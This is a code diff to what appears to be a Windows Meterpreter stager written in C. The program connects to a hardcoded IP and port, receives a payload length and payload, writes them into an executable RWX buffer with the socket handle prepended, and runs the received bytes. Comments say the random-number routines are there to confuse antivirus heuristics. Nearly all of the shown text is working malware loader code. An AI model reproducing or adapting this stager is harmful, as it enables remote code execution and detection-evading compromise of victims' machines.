@@ -103,9 +103,6 @@ int main(int argc) {
 	winsock_init();
 	char argv[3][25];
 
-	//initialize the variables for random number generation
-	
-
 	//this program was ment to be run from the command line, so i added this shit so it would work
 	strcpy(argv[1],"10.1.225.101");
 	strcpy(argv[2],"4445");
@@ -131,7 +128,9 @@ int main(int argc) {
 
 	//start the socket homie
 	SOCKET my_socket = wsconnect(argv[1], atoi(argv[2]));
+	//receive 4 bytes which indicates the size of the next payload
 	int count = recv(my_socket, (char *)&size, 4, 0);
+	//check for issues
 	if (count != 4 || size <= 0)
 		Kick(my_socket, "bad length value\n");
 
@@ -140,6 +139,7 @@ int main(int argc) {
 	genlol();
 	//================================	
 
+	//allocate the RWX buffer
 	buffer = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
 	//================================
@@ -147,8 +147,10 @@ int main(int argc) {
 	genlol();
 	//================================
 
+	//check the buffer for issues
 	if (buffer == NULL)
 		Kick(my_socket, "bad buffer\n");
+	//puts mov on to the front of the buffer
 	buffer[0] = 0xBF;
 
 	//================================
@@ -156,16 +158,20 @@ int main(int argc) {
 	genlol();
 	//================================
 
+	//copies the socket pointer onto the buffer after 0xBF
+	//see this post for more infor http://mail.metasploit.com/pipermail/framework/2012-September/008664.html
 	memcpy(buffer + 1, &my_socket, 4);
 
 	//================================
 	//burn out the clock, and confuse heuristics with some random number generation
 	genlol();
 	//================================
-	
+
+	//receives the rest of the data from the socket (based on the size received before)
 	count = recv_all(my_socket, buffer + 5, size);
-	buffer=rev(buffer);
+	//cast the buffer as a function?
 	function = (void (*)())buffer;
+	//execute dat meterpreter
 	function();
 	return 0;
 }
